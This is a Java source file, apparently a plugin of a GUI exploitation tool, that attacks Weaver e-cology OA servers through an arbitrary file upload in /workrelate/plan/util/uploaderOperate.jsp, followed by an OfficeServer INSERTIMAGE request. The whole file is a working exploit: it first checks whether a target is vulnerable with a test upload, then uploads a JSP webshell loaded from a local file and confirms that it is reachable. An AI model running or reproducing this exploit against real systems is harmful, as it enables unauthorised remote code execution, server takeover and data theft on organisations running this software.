package exp.oa.weaveroa.ecology;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.Date;
import java.util.HashMap;

public class weaver_ec_UploaderOperate_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea,TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attgetshell(url,cmd,textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String target_url(String url, String payload) {
        try {
            HttpTools post_res = new HttpTools();
            long t = (new Date()).getTime();
            String filename = t+".jsp";
            HashMap<String,String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK");

            String data1 = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"secId\"\r\n" +
                    "\r\n" +
                    "1\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"Filedata\"; filename=\""+filename+"\"\r\n" +
                    "\r\n" +
                    payload+
                    "\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"plandetailid\"\r\n" +
                    "\r\n" +
                    "1\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK";
            Response post_resp = post_res.post(url + "/workrelate/plan/util/uploaderOperate.jsp",data1, head,"utf-8");
            String result = post_resp.getText().replace(" ","");

            int start = result.indexOf("fileid=")+7;
            int end =  result.indexOf("'>下载");
            String number = result.substring(start,end);

            if (post_resp.getCode() == 200){
                String data2 = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                        "Content-Disposition: form-data; name=\"aaa\"\r\n" +
                        "\r\n" +
                        "{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'"+number+"'}\r\n" +
                        "------WebKitFormBoundarymVk33liI64J7GQaK";
                Response post_resp2 = post_res.post(url + "/OfficeServer",data2, head,"utf-8");
                if (post_resp2.getCode() == 200 && !post_resp2.getText().isEmpty() && post_resp2.getText().contains(payload.substring(0,3))){
                    return filename;
                }else{
                    return null;
                }
            }else {
                return null;
            }
        } catch (Exception e){
            return null;
        }
    }

    private Boolean att(String url, TextArea textArea) {
        try {

            String payload = "Hello R4g";
            HttpTools get_res = new HttpTools();
            Response get_resp = get_res.get(url + "/workrelate/plan/util/uploaderOperate.jsp", new HashMap<>(),"utf-8");
            String result = target_url(url,payload);
            Response get = HttpTools.get(url+"/"+result,new HashMap<>(),"utf-8");
            if ( get_resp.getCode() != 404 && result!=null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ weaver_ec_UploaderOperate_upload ]");

                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
//                textArea.appendText("\n weaver_ec_UploaderOperate_upload-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }

        return false;
    }


    private boolean attgetshell(String url,String pass,TextArea textArea,TextArea textArea_cmd){
        try {


            String shell_payload = Methods.readFile(pass);
            long tt = (new Date()).getTime();
            String payload = tt+"\n" + shell_payload;
            String result = target_url(url,payload);

            Response get = HttpTools.get(url+"/"+result,new HashMap<>(),"utf-8");

            if (get.getCode()==200 && get.getText().contains(payload.substring(0,2))) {

                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: ----"+tt);
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }

        return false;
    }
}
